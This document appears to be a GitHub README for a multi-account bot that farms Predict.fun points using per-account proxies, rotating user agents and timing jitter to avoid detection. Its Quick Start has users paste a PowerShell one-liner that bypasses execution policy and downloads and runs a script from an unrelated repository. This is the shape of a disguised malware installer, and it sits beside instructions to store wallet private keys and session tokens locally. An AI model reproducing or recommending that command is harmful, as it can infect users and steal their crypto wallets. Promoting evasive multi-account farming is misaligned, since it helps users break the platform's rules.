# 🤖 Predict.fun Bot

> Automated multi-account bot for [Predict.fun](https://predict.fun) — places predictions, completes daily tasks, and farms points across unlimited accounts with per-account proxy support

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Predict.fun](https://img.shields.io/badge/Predict.fun-Testnet-F59E0B?style=for-the-badge&logoColor=white)](https://predict.fun)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/predictfun-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/predictfun-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Module 1 — Auto Predictor   │  place predictions automatically ║
║  Module 2 — Daily Tasks      │  complete all tasks every cycle  ║
║  Module 3 — Points Farmer    │  full automation across N accs   ║
║                                                                  ║
║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Join Predict.fun](https://predict.fun)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/AbeerNAZ/Predict-Fun-Farming-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📘 Project-Specific Setup

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks
```

### Step 4 — Get your Predict.fun session tokens

For each account:

1. Log in to [predict.fun](https://predict.fun)
2. Open DevTools (`F12`) → **Application** → **Cookies** → `predict.fun`
3. Copy the auth/session token value
4. Paste it into `predict_token` in `accounts.json`

> ⚠️ Session tokens expire periodically. When a token expires, only that account pauses and sends a Telegram alert — all others keep running.

### Step 5 — Build your accounts.json

```bash
cp accounts.example.json accounts.json
nano accounts.json
```

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [How It Works](#-how-it-works)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Modules](#-modules)
  - [Module 1 — Auto Predictor](#-module-1--auto-predictor)
  - [Module 2 — Daily Tasks](#-module-2--daily-tasks)
  - [Module 3 — Points Farmer](#-module-3--points-farmer)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  Predict.fun opens new prediction markets
          │
          ▼  (all accounts check simultaneously)
          │
  Per account:
    • Authenticate with session token
    • Route traffic through assigned proxy
    • Fetch open markets + available tasks
    • Place predictions on eligible markets
    • Complete daily/weekly tasks
    • Maintain check-in streak
          │
          ▼
  Points credited to each account  🎯
          │
          ▼
  Telegram summary sent  📱
```

Every account runs as an independent async worker — one expired token or failed proxy never blocks the others.

---

## 👥 Multi-Account & Proxy Support

### How accounts are configured

All accounts live in a single `accounts.json` file. Each entry holds its own credentials, session token, prediction strategy, and optionally a dedicated proxy.

```
  accounts.json
  ├── Account #1  →  wallet_1 + token_1 + proxy_1
  ├── Account #2  →  wallet_2 + token_2 + proxy_2
  ├── Account #3  →  wallet_3 + token_3 + (no proxy)
  └── ...unlimited accounts
          │
          ▼
  Bot spawns one async worker per account
          │
          ▼
  Workers run in parallel up to MAX_PARALLEL
  Remaining accounts queue and start as slots free
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Main wallet",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "predict_token": "your_session_token_1",
    "referral_code": "YOUR_REF",
    "strategy": "majority",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "account_2",
    "label": "Secondary",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "predict_token": "your_session_token_2",
    "referral_code": "YOUR_REF",
    "strategy": "contrarian",
    "proxy": "socks5://user:pass@host:port"
  },
  {
    "id": "account_3",
    "label": "No proxy",
    "wallet_address": "0xYourWallet3",
    "private_key": "0xYourPrivateKey3",
    "predict_token": "your_session_token_3",
    "referral_code": "YOUR_REF",
    "strategy": "random",
    "proxy": ""
  }
]
```

> 💡 **Tip:** You can run different prediction strategies on different accounts — e.g. `majority` on account_1 and `contrarian` on account_2 — to diversify across markets and maximize total predicted volume.

### Proxy formats supported

| Format | Example |
|--------|---------|
| HTTP | `http://user:pass@host:port` |
| HTTPS | `https://user:pass@host:port` |
| SOCKS5 | `socks5://user:pass@host:port` |
| No auth | `http://host:port` |
| None | leave `"proxy": ""` |

### Concurrency & safety settings

```env
MAX_PARALLEL=5              # Max accounts running at the same time
ACCOUNT_DELAY=15            # Seconds between launching each worker
JITTER=true                 # Random ±10s delay per action (human-like)
PROXY_TEST_ON_START=true    # Verify each proxy before farming begins
ROTATE_USER_AGENT=true      # Unique user-agent header per account
```

> 💡 **Tip:** With 10+ accounts, set `MAX_PARALLEL=5` and `ACCOUNT_DELAY=15` to avoid triggering rate limits. Enable `PROXY_TEST_ON_START=true` — dead proxies get flagged before the cycle starts, not halfway through.

---

## 📐 Modules

### 🔮 Module 1 — Auto Predictor

The bot scans open prediction markets on Predict.fun and automatically places predictions on behalf of each account according to its configured strategy.

```
  Fetch open markets  (per account)
              │
              ▼
  Filter: active | not yet predicted | within bet window
              │
              ▼
  Apply prediction strategy:
    • majority   → follow the crowd (most popular side)
    • contrarian → bet against the crowd
    • random     → coin flip (max volume coverage)
    • custom     → your own keyword/category filters
              │
              ▼
  Place prediction tx  →  signed with account wallet  ✅
              │
              ▼
  Wait for market resolution  →  collect rewards if correct  🎯
```

**Prediction strategies:**

| Strategy | Logic | Best for |
|----------|-------|----------|
| `majority` | Always bet with the leading side | Safer volume farming |
| `contrarian` | Always bet against the leading side | Higher odds, more variance |
| `random` | Random YES / NO per market | Maximum market coverage |
| `custom` | Filter by category / keyword | Targeted farming |

**Config block:**

```env
MODULE=predictor
PREDICT_STRATEGY=majority          # Default strategy (overridden per account)
PREDICT_AMOUNT=1                   # Amount to bet per prediction (in platform units)
PREDICT_MAX_PER_CYCLE=10           # Max predictions per account per cycle
PREDICT_CATEGORIES=crypto,sports   # Only predict in these categories (blank = all)
PREDICT_MIN_POOL=100               # Skip markets with less than N total bets
PREDICT_INTERVAL=3600              # Check for new markets every N seconds
```

> 💡 **Tip:** Keep `PREDICT_AMOUNT` at the minimum required — the goal is volume and points, not gambling. The `majority` strategy minimizes losses while still hitting participation tasks.

---

### ✅ Module 2 — Daily Tasks

The bot fetches the full task list for each account and completes every eligible task automatically, in order of highest points first.

```
  Authenticate account  (token + optional proxy)
              │
              ▼
  Fetch task list  →  filter by: daily | weekly | one-time
              │
              ▼
  Sort by points descending
              │
              ▼
  Execute each eligible task:
    • Daily check-in  (streak ping)
    • Prediction volume task  (place N predictions)
    • Social task  (follow, share, repost)
    • Referral task  (if applicable)
              │
              ▼
  Mark complete → points credited ✅
```

**Supported task types:**

| Task Type | Description | Frequency |
|-----------|-------------|-----------|
| Daily check-in | Streak ping once per 24h | Daily |
| Prediction task | Place N predictions in a cycle | Daily / Weekly |
| Volume task | Reach total prediction volume | Weekly |
| Social task | Follow / share / repost | One-time / Weekly |
| Referral bonus | Points for referred accounts | Ongoing |

**Config block:**

```env
MODULE=tasks
TASK_TYPES=checkin,predict,volume,social
TASK_INTERVAL=3600
TASK_PRIORITY=points_desc
SKIP_TASKS=                          # Comma-separated task IDs to skip
MAX_TASKS_PER_RUN=20
```

> 💡 **Tip:** `checkin` should always be in `TASK_TYPES` — it protects your streak multiplier which boosts points on every other task.

---

### 🌾 Module 3 — Points Farmer

Combines both modules into a fully automated loop. Each account runs its own independent cycle — predictions, tasks, streaks — all tracked separately.

```
  All account workers start  (staggered by ACCOUNT_DELAY)
          │
          ▼  each worker independently:
          │
  Place predictions on open markets  (Module 1)
          │
          ▼
  Complete available tasks  (Module 2)
          │
          ▼
  Wait CYCLE_INTERVAL
          │
          ▼
  Daily cap reached?
    • NO  → next cycle
    • YES → sleep until reset  😴
          │
          ▼
  Telegram summary: points per account, predictions made  📱
```

**Config block:**

```env
MODULE=farmer
DAILY_POINTS_CAP=1000              # Per-account daily target (0 = no cap)
CYCLE_INTERVAL=3600                # Seconds between farming cycles
FARMER_START_TIME=07:00
FARMER_STOP_TIME=23:30
POST_CYCLE_SUMMARY=true            # Send Telegram summary after each cycle
```

---

## ⚙️ Configuration

### `accounts.json` — one entry per account

See [Multi-Account & Proxy Support](#-multi-account--proxy-support) above for the full structure.

### `.env` — global settings

```env
# ── Active module ──────────────────────────────────────
# Options: predictor | tasks | farmer
MODULE=farmer

# ── Multi-account ──────────────────────────────────────
ACCOUNTS_FILE=accounts.json
MAX_PARALLEL=5
ACCOUNT_DELAY=15
JITTER=true
PROXY_TEST_ON_START=true
ROTATE_USER_AGENT=true

# ── Prediction settings ────────────────────────────────
PREDICT_STRATEGY=majority
PREDICT_AMOUNT=1
PREDICT_MAX_PER_CYCLE=10
PREDICT_CATEGORIES=
PREDICT_MIN_POOL=100
PREDICT_INTERVAL=3600

# ── Task settings ──────────────────────────────────────
TASK_TYPES=checkin,predict,volume,social
TASK_INTERVAL=3600
TASK_PRIORITY=points_desc
MAX_TASKS_PER_RUN=20

# ── Farming schedule ───────────────────────────────────
DAILY_POINTS_CAP=1000
CYCLE_INTERVAL=3600
FARMER_START_TIME=07:00
FARMER_STOP_TIME=23:30

# ── Telegram (optional but recommended) ────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

---

## 🚀 Running the Bot

```bash
# First-time setup (creates accounts.json template)
python predictfun_bot.py --setup

# Run all accounts
python predictfun_bot.py

# Run a single account only
python predictfun_bot.py --account account_1

# Single cycle and exit
python predictfun_bot.py --once

# Test proxies without farming
python predictfun_bot.py --test-proxies

# Dashboard only
python predictfun_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Predict.fun Bot v1.0                           ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Module:      farmer
  Accounts:    4 loaded
  Proxies:     3 assigned  (1 direct)
  Parallel:    up to 5
  Strategy:    majority (default)
  Jitter:      ON

  Testing proxies... ██████████  3/3 OK

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Predict.fun Bot v1.0                    updated 09:04:15
══════════════════════════════════════════════════════════════
  Module: farmer   Accounts: 4   Next cycle: 41m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID            Points today   Streak    Strategy     Status
  account_1     510 / 1000     🔥 18d    majority     ● running
  account_2     390 / 1000     🔥 11d    contrarian   ● running
  account_3     680 / 1000     🔥 25d    random       ● running
  account_4       0 / 1000         3d    majority     ⏳ queued
──────────────────────────────────────────────────────────────
  PREDICTIONS TODAY  (account_3)
  Market                        Side   Amount   Result
  BTC > $100k by EOY?           YES      1      ⏳ open
  ETH flips BTC in 2025?        NO       1      ✅ correct
  SOL hits $500 this quarter?   YES      1      ❌ wrong
──────────────────────────────────────────────────────────────
  TASKS  (account_1)
  Task                   Status      Points
  Daily check-in         ✅ done     +25
  Place 5 predictions    ✅ done     +100
  Volume task (weekly)   ⏳ pending  +200
──────────────────────────────────────────────────────────────
  RECENT ACTIVITY
  09:04:15  account_3   Prediction placed     BTC > $100k
  09:03:40  account_1   Check-in              +25 pts
  09:03:05  account_2   Prediction task done  +100 pts
  09:01:22  account_3   ETH prediction won    +reward
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/predictfun-bot
cd predictfun-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks

# 4. Configure
nano .env
nano accounts.json

# 5. Run inside screen (stays alive after you disconnect)
screen -S predictbot
source venv/bin/activate
python predictfun_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r predictbot
```

### Useful log commands

```bash
tail -50 predictfun_bot.log
grep "prediction" predictfun_bot.log | tail -20   # All predictions
grep "correct\|wrong" predictfun_bot.log | tail -20 # Results
grep "completed" predictfun_bot.log | tail -20    # Completed tasks
grep "token expired" predictfun_bot.log | tail -10 # Token alerts
grep "ERROR" predictfun_bot.log | tail -10        # Errors
```

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | All accounts: points, streaks, strategy, proxy |
| `/predictions` | Today's predictions per account with results |
| `/tasks` | Completed and pending tasks per account |
| `/pause` | Pause all accounts |
| `/pause account_1` | Pause one specific account |
| `/resume` | Resume all accounts |
| `/proxies` | Proxy health status for all accounts |
| `/stop` | Stop the bot completely |
| `/points` | Full points breakdown across all accounts |

### Example alerts

```
🔮 Prediction Placed
Account:  account_1
Market:   BTC > $100k by EOY?
Side:     YES
Strategy: majority

✅ Prediction Resolved
Account:  account_2
Market:   ETH flips BTC in 2025?
Result:   CORRECT ✅
Reward:   +points credited

✅ Task Completed
Account:  account_3
Task:     Place 5 predictions
Points:   +100
Total:    680 / 1000 today

⚠️ Token Expired
Account:  account_2
Action:   refresh predict_token in accounts.json
Status:   account_2 paused — all others still running

⚠️ Proxy Failed
Account:  account_1
Proxy:    proxy_2
Action:   falling back to direct connection

🌙 Daily Cap Reached
account_1 → 1000 / 1000 pts  😴
account_3 → 1000 / 1000 pts  😴
account_2 →  390 / 1000 pts  ● still farming
```

---

## ⚠️ Disclaimer

> **IMPORTANT:** This bot interacts with a prediction platform on your behalf. Use responsibly and in accordance with Predict.fun's terms of service.

- Never share your `accounts.json`, private keys, or session tokens with anyone
- With many accounts on the same IP, use proxies to avoid rate-limit bans
- Keep `PREDICT_AMOUNT` at minimum — this is a points farming tool, not a betting system
- Session tokens expire — the bot notifies you per account, others keep running
- Dead proxies are flagged at startup — replace them before the cycle begins
- Testnet points and rewards are subject to Predict.fun's final airdrop/TGE rules — nothing is guaranteed

---

## 🔗 Links

[![Predict.fun](https://img.shields.io/badge/🔮_Predict.fun-Open_App-F59E0B?style=for-the-badge)](https://predict.fun)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`predictfun-bot` `predict-fun-bot` `prediction-bot` `points-farmer` `multi-account-bot` `crypto-bot` `automated-farming` `defi-farming` `auto-predictor` `daily-tasks` `streak-keeper` `proxy-support` `async-bot` `python-bot` `prediction-markets` `task-automation` `points-mining` `prediction-farming` `betting-bot` `market-prediction`
